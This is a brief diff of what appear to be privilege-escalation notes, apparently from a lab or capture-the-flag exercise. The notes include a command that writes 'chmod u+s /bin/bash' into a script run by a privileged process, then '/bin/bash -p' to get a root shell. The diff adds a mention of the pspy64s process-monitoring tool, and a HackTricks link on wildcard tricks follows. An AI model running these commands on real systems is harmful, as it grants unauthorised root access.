@@ -4,6 +4,8 @@ echo "chmod u+s /bin/bash" > initdb.sh
 /bin/bash -p
 ------------------
 
+memory dump (pspy64s)
+
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
 
 
